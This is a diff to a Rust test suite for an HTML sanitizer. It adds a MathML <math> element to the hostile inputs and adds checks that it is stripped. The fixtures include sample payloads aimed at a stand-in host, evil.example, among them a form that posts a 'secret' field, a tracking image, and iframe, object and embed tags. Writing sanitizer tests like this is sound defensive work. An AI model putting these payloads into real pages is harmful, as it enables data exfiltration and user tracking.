@@ -241,6 +241,7 @@ mod tests {
                 "<form action=\"https://evil.example/post\"><input name=\"secret\" value=\"x\"></form>",
                 "<img src=\"https://evil.example/tracker.png\">",
                 "<svg><a href=\"https://evil.example/svg\">svg text</a></svg>",
+                "<math><mi>math text</mi></math>",
                 "<iframe src=\"https://evil.example/frame\">frame text</iframe>",
                 "<object data=\"https://evil.example/object\">object text</object>",
                 "<embed src=\"https://evil.example/embed\">",
@@ -262,6 +263,7 @@ mod tests {
         assert!(!sanitized.body_html.contains("<input"));
         assert!(!sanitized.body_html.contains("<img"));
         assert!(!sanitized.body_html.contains("<svg"));
+        assert!(!sanitized.body_html.contains("<math"));
         assert!(!sanitized.body_html.contains("<iframe"));
         assert!(!sanitized.body_html.contains("<object"));
         assert!(!sanitized.body_html.contains("<embed"));
@@ -274,6 +276,7 @@ mod tests {
         assert!(!sanitized.body_html.contains("background-image"));
         assert!(!sanitized.body_html.contains("evil.example"));
         assert!(!sanitized.body_html.contains("svg text"));
+        assert!(!sanitized.body_html.contains("math text"));
         assert!(!sanitized.body_html.contains("frame text"));
         assert!(!sanitized.body_html.contains("object text"));
         assert!(!sanitized.body_html.contains("template text"));
